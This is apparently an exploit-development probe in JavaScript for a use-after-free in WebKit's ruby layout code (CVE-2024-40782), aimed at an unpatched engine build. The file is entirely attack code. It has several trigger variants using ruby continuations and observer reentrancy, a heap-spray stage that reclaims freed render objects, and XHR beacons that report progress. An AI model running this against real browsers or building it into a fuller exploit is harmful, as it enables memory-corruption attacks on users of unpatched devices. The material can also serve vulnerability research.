// p208 — Ruby layout continuation UAF probe
//
// CVE-2024-40782: Use-after-free in RenderTreeBuilderRuby
//
// Bug: findOrCreateParentForStyleBasedRubyChild assumes a RubyBlock's
// first child is the Ruby box, but continuations insert anonymous
// wrappers. When this assumption fails, stale pointer → UAF.
//
// Fixed in Safari 17.6 (July 2024). WebKit-1200 (Dec 2023) lacks fix.
// Trigger is pure HTML — no JIT, no special APIs needed.
//
// Regression test: <ruby style="position:absolute"><rb><span>base with
//   <div>forced</div> line break</span></rb></ruby>
//
// The <div> inside <rb><span> forces a block continuation, which inserts
// an anonymous wrapper. The absolute positioning triggers a different
// layout path where the stale first-child assumption causes UAF.
//
// Beacon prefix: V208-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V208-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  var tests = [];
  var currentTest = 0;

  // ── TEST A: Exact regression test reproduction ──
  tests.push({name: 'A-EXACT-REPRO', run: function(done) {
    try {
      var container = document.createElement('div');
      container.innerHTML = '<ruby style="position: absolute"><rb><span>base with <div>forced</div> line break</span></rb></ruby>';
      document.body.appendChild(container);
      B('A-INSERTED');

      // Force layout
      var _ = document.body.offsetHeight;
      B('A-LAYOUT-1');

      // Force style recalc
      _ = container.getBoundingClientRect();
      B('A-LAYOUT-2');

      setTimeout(function() {
        B('A-SURVIVED');
        container.remove();
        done();
      }, 500);
    } catch (e) {
      B('A-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST B: Amplified version — multiple ruby blocks with continuations ──
  tests.push({name: 'B-AMPLIFIED', run: function(done) {
    try {
      var container = document.createElement('div');
      container.style.cssText = 'position:relative; width:400px;';
      document.body.appendChild(container);

      var html = '';
      for (var i = 0; i < 50; i++) {
        html += '<ruby style="position:absolute; left:' + (i*5) + 'px; top:' + (i*10) + 'px;">';
        html += '<rb><span>base' + i + ' with <div>forced block ' + i + '</div> continuation</span></rb>';
        html += '<rt>annotation ' + i + '</rt>';
        html += '</ruby>';
      }
      container.innerHTML = html;
      B('B-INSERTED-50');

      var _ = document.body.offsetHeight;
      B('B-LAYOUT');

      setTimeout(function() {
        B('B-SURVIVED-LAYOUT');
        // Now remove and re-add to stress the layout tree builder
        container.innerHTML = '';
        B('B-CLEARED');
        container.innerHTML = html;
        _ = document.body.offsetHeight;
        B('B-REBUILT');

        setTimeout(function() {
          B('B-SURVIVED-REBUILD');
          container.remove();
          done();
        }, 500);
      }, 200);
    } catch (e) {
      B('B-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST C: Ruby with heap spray after trigger ──
  tests.push({name: 'C-SPRAY', run: function(done) {
    try {
      // First, create many ruby elements to populate the layout tree
      var container = document.createElement('div');
      container.style.cssText = 'position:relative;';
      document.body.appendChild(container);

      var rubies = [];
      for (var i = 0; i < 100; i++) {
        var ruby = document.createElement('ruby');
        ruby.style.cssText = 'position:absolute; left:0; top:' + (i*2) + 'px;';
        ruby.innerHTML = '<rb><span>text<div>block</div>more</span></rb><rt>ann</rt>';
        container.appendChild(ruby);
        rubies.push(ruby);
      }
      B('C-CREATED-100');

      // Force layout to build all render objects
      var _ = document.body.offsetHeight;
      B('C-LAYOUT');

      // Remove ruby elements (frees RenderRubyBlock objects)
      for (var j = 0; j < rubies.length; j++) {
        rubies[j].remove();
      }
      B('C-REMOVED');

      // Heap spray to reclaim freed render objects
      var spray = [];
      for (var k = 0; k < 10000; k++) {
        spray.push(new Uint32Array(16)); // 64 bytes, ~RenderObject size class
      }
      B('C-SPRAYED-10K');

      // Re-add ruby elements — layout tree builder may use stale objects
      for (var m = 0; m < 50; m++) {
        var ruby2 = document.createElement('ruby');
        ruby2.style.cssText = 'position:absolute;';
        ruby2.innerHTML = '<rb><span>x<div>y</div>z</span></rb>';
        container.appendChild(ruby2);
      }
      B('C-READDED-50');

      _ = document.body.offsetHeight;
      B('C-LAYOUT-2');

      setTimeout(function() {
        B('C-SURVIVED');
        spray = null;
        container.remove();
        done();
      }, 500);
    } catch (e) {
      B('C-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST D: Ruby continuation with inline-block + float ──
  tests.push({name: 'D-INLINE-BLOCK', run: function(done) {
    try {
      var container = document.createElement('div');
      container.style.cssText = 'width:300px;';
      document.body.appendChild(container);

      // Additional continuation triggers: float and inline-block inside ruby
      var patterns = [
        '<ruby style="position:absolute"><rb><span>a<div style="float:left">floated</div>b</span></rb></ruby>',
        '<ruby style="display:block"><rb><span>x<div>block</div>y</span></rb><rt>top</rt></ruby>',
        '<ruby style="position:absolute"><rb><div>direct block child</div></rb></ruby>',
        '<ruby style="position:absolute"><rb><span>a</span><div>between spans</div><span>b</span></rb></ruby>',
        '<ruby style="position:fixed"><rb><span>fixed<div>block</div>pos</span></rb></ruby>',
        '<ruby style="position:absolute"><rb><span style="display:contents">contents<div>block</div></span></rb></ruby>',
        '<ruby><rb style="position:absolute"><span>pos rb<div>block</div></span></rb></ruby>',
        '<ruby style="position:absolute"><rb><span>nested<ruby><rb><div>deep block</div></rb></ruby></span></rb></ruby>',
      ];

      for (var i = 0; i < patterns.length; i++) {
        var div = document.createElement('div');
        div.innerHTML = patterns[i];
        container.appendChild(div);
      }
      B('D-PATTERNS-' + patterns.length);

      var _ = document.body.offsetHeight;
      B('D-LAYOUT');

      // Modify to trigger relayout
      for (var j = 0; j < container.children.length; j++) {
        container.children[j].style.width = (200 + j * 10) + 'px';
      }
      _ = document.body.offsetHeight;
      B('D-RELAYOUT');

      setTimeout(function() {
        B('D-SURVIVED');
        container.remove();
        done();
      }, 500);
    } catch (e) {
      B('D-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST E: Dynamic ruby structure modification during layout ──
  tests.push({name: 'E-DYNAMIC', run: function(done) {
    try {
      var container = document.createElement('div');
      container.style.cssText = 'position:relative;';
      document.body.appendChild(container);

      // Create initial ruby structure
      var ruby = document.createElement('ruby');
      ruby.style.position = 'absolute';
      var rb = document.createElement('rb');
      var span = document.createElement('span');
      span.textContent = 'base text';
      rb.appendChild(span);
      ruby.appendChild(rb);
      container.appendChild(ruby);
      B('E-INITIAL');

      var _ = document.body.offsetHeight;

      // Now dynamically insert block element to create continuation
      var blockDiv = document.createElement('div');
      blockDiv.textContent = 'forced block';
      span.insertBefore(blockDiv, span.firstChild);
      B('E-BLOCK-INSERTED');

      // Force layout — this should trigger the findOrCreateParent path
      _ = document.body.offsetHeight;
      B('E-LAYOUT-AFTER-INSERT');

      // MutationObserver + rapid modifications
      var moFired = 0;
      var mo = new MutationObserver(function() {
        moFired++;
        if (moFired === 1) {
          // Remove the block during MO callback
          try {
            span.removeChild(blockDiv);
            B('E-BLOCK-REMOVED-IN-MO');
          } catch (e) {}
        }
      });
      mo.observe(span, {childList: true, subtree: true});

      // Insert another block to trigger MO
      var block2 = document.createElement('div');
      block2.textContent = 'second block';
      span.appendChild(block2);

      setTimeout(function() {
        _ = document.body.offsetHeight;
        B('E-FINAL-LAYOUT-MO' + moFired);
        mo.disconnect();
        container.remove();
        done();
      }, 500);
    } catch (e) {
      B('E-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST F: Ruby + ResizeObserver interaction ──
  tests.push({name: 'F-RESIZE-OBS', run: function(done) {
    try {
      var container = document.createElement('div');
      container.style.cssText = 'position:relative; width:400px;';
      document.body.appendChild(container);

      var ruby = document.createElement('ruby');
      ruby.style.position = 'absolute';
      ruby.innerHTML = '<rb><span>base<div>block</div>text</span></rb><rt>top</rt>';
      container.appendChild(ruby);
      B('F-CREATED');

      var roFired = 0;
      var ro = new ResizeObserver(function(entries) {
        roFired++;
        if (roFired <= 3) {
          B('F-RO-' + roFired);
          // During resize callback, modify ruby structure
          var newBlock = document.createElement('div');
          newBlock.textContent = 'injected-' + roFired;
          newBlock.style.cssText = 'width:' + (100 + roFired * 50) + 'px;';
          var rb = ruby.querySelector('rb span');
          if (rb) rb.appendChild(newBlock);

          // Change container width to trigger another resize
          container.style.width = (400 + roFired * 50) + 'px';
        }
      });
      ro.observe(ruby);

      // Trigger initial resize
      container.style.width = '450px';

      setTimeout(function() {
        B('F-RO-TOTAL-' + roFired);
        ro.disconnect();
        container.remove();
        done();
      }, 3000);
    } catch (e) {
      B('F-ERR-' + e.name);
      done();
    }
  }});

  // ── Run all tests ──
  function runNext() {
    if (currentTest >= tests.length) {
      B('ALL-DONE');
      return;
    }
    var t = tests[currentTest++];
    B(t.name + '-START');

    var completed = false;
    var timeout = setTimeout(function() {
      if (!completed) { completed = true; B(t.name + '-TIMEOUT'); runNext(); }
    }, 12000);

    t.run(function() {
      if (!completed) { completed = true; clearTimeout(timeout); B(t.name + '-END'); setTimeout(runNext, 300); }
    });
  }

  runNext();
})();
